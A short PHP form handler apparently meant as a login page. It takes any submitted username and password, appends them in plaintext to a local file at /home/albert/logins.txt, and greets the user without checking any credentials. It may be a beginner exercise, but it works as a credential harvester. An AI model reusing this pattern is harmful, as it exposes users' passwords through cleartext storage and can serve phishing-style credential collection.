<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['pswrd']);

    $filePath = "/home/albert/logins.txt";

    if ($file = fopen($filePath, "a")) {
        fwrite($file, "Username: $username, Password: $password\n");
        fclose($file);
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <title>Welcome!</title>
      <link rel="stylesheet" href="namer.css" />
      <script src="login.js" defer></script>
    </head>
    <body>
      <h1>Welcome, <?php echo $username; ?>! 🎉</h1>
    </body>
    </html>
    <?php
} else {
    echo "Invalid request.";
}
?>
